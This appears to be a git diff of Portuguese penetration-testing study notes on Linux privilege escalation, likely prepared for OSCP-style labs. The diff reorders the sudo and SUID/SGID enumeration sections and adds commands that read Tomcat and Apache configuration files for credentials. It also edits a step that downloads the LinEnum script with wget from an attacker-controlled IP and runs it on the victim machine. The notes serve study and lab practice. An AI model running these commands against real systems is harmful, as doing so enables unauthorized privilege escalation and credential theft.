@@ -3,6 +3,22 @@ Linux PrivEsc
 
 Seguindo o a mesma premissa do windows, vamos verificar primeiramente o kernel e em sequência gente pode olhar alguns diretórios logo de cara:
 
+## Sudo access
+
+    sudo -i
+    sudo su
+    sudo -
+    
+    # Este temos de verificar os binários que podemos executar com permissão de root
+    sudo -l
+
+## SUID e SGID
+
+Com isso podemos executar o arquivo (caso seja um executável) conforme a permissão do dono do arquivo. Ou seja, se o dono do arquivo for root e o SUID bit estiver definido para o binário, podemos realizar a escalação de privilégio.
+
+    find / -perm -u=s -type f 2>/dev/null
+    find / -perm -g=s -type f 2>/dev/null
+
 ## Kernel exploitation
 
 <https://gabb4r.gitbook.io/oscp-notes/linux-post-exploitation/kernel-exploitation>
@@ -31,6 +47,11 @@ https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
 
 ## Navegar nos diretórios
 
+Aqui alguns detalhes na hora de navegar nos diretórios. Temos que verificar se existem outras aplicações rodando quando temos um apache na máquina alvo, assim como credenciais em seus arquivos de configuração. Vide que é possível obter i8sso por meio dos seguintes arquivos:
+
+    cat /opt/tomcat/conf/tomcat-users.xml
+    cat /etc/apache2/sites-enabled/*.conf
+
     ls -al /usr/local/
     ls -al /usr/local/src
     ls -al /usr/local/bin
@@ -38,6 +59,7 @@ https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
     ls -R -al /home #Fazer recursivamente neste
     ls -al /var/
     ls -al /usr/src/
+
 
 OS COMANDOS AQUI SÃO EXECUTADOS TODOS NA MÁQUINA VÍTIMA
 
@@ -47,20 +69,13 @@ OS COMANDOS AQUI SÃO EXECUTADOS TODOS NA MÁQUINA VÍTIMA
     #non-system users
     awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
 
-## SUID e SGID
-
-Com isso podemos executar o arquivo (caso seja um executável) conforme a permissão do dono do arquivo. Ou seja, se o dono do arquivo for root e o SUID bit estiver definido para o binário, podemos realizar a escalação de privilégio.
-
-    find / -perm -u=s -type f 2>/dev/null
-    find / -perm -g=s -type f 2>/dev/null
-
 ## LinEnum
 
 https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
-    wget http://10.10.14.17/linux/4-privilege_escalation/LinEnum.sh -O linenum.sh
-    chmod +x linenum.sh
-    ./lieneum.sh
+    wget http://10.10.14.17/4-privilege_escalation/LinEnum.sh -O le.sh
+    chmod +x le.sh
+    ./le.sh
 
 ou 
 
@@ -97,6 +112,8 @@ https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
     crontab -l
     cat /etc/crontab
     ls -lah /etc/cron* 
+
+    grep "CRON" /var/log/cron.log
 
 ## Process Enumeration
 
@@ -149,14 +166,6 @@ Generally, source code with hard coded credentials. Searcvh for php files, for e
 
 Dump de credenciais do banco de dados
 
-## Sudo access
-
-    sudo -i
-    sudo su
-    sudo -
-    
-    # Este temos de verificar os binários que podemos executar com permissão de root
-    sudo -l
 
 ## SSH keys
 
